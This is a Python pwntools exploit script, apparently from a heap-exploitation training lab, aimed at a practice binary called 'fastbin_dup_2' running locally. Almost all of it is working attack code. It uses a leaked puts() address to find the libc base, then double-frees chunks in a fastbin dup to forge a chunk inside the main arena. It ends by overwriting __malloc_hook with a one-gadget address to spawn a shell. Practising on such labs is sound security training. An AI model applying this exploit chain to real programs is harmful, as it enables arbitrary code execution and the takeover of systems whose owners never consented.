#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
gs = '''
continue
'''

elf = context.binary = ELF('./fastbin_dup_2')
libc = ELF(elf.runpath + b'/libc.so.6')
rop = ROP(elf)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

# index of allocated chunks
index = 0

# select the 'malloc' option; send size & data.
# returns chunk index
def malloc(size, data):
    global index
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'size: ', f'{size}'.encode())
    r.sendlineafter(b'data: ', data)
    r.recvuntil(b'>')
    index += 1
    return index - 1

# select the "free" option; send index
def free(index):
    r.sendlineafter(b'>', b'2')
    r.sendlineafter(b'index: ', f'{index}'.encode())
    r.recvuntil(b'>')

# thankfully, this binary leaks the address of puts(), use it to resolve the libc load address
r.recvuntil(b'puts() @ ')
libc.address = int(r.recvline(), 16) - libc.sym.puts
r.timeout = 0.1

# WRITE A SIZE FIELD INTO THE MAIN ARENA

# request two 0x50-sized chunks and fill them with data
chunk_A = malloc(0x48, b'A'*8)
chunk_B = malloc(0x48, b'B'*8)

# free willy and the first chunk :v, then the second
free(chunk_A)
free(chunk_B)
free(chunk_A)

# tamper with fastbin metadata
#malloc(0x48, p64(0xdeadbeef))

# overwrite a fastbin fd with a fake size field.
malloc(0x48, p64(0x61))

# request chunks B & A, leaving the 0xdeadbeef value at the head of the 0x50 fastbin.
malloc(0x48, b'C'*8)
malloc(0x48, b'D'*8)

# LINK THE FAKE MAIN ARENA CHUNK INTO THE 0x60 FASTBIN 

# another fastbin fastbin dup 
chunk_J = malloc(0x58, b'J'*8)
chunk_K = malloc(0x58, b'K'*8)

free(chunk_J)
free(chunk_K)
free(chunk_J)

# link the fake chunk into the 0x60 fastbin 
malloc(0x58, p64(libc.sym.main_arena + 0x20))

# move the fake chunk to the head of the 0x60 fastbin
#malloc(0x58, b'L'*8)
malloc(0x58, b'-p\0'*8)
#malloc(0x58, b'M'*8)
malloc(0x58, b'-s\0'*8)

# request the fake chunk overlapping the main arena 
malloc(0x58, b'Y'*48 + p64(libc.sym.__malloc_hook - 35))

# OVERWRITE THE MALLOC HOOK 
malloc(0x28, b'Y'*19 + p64(libc.address + 0xe1fa1))
#malloc(0x28, b'Y'*19 + p64(0xdeadbeef))

# call malloc() which is redirected  to one-gadget via the malloc hook 
malloc(1, '')

#============= interactive ================

r.interactive()
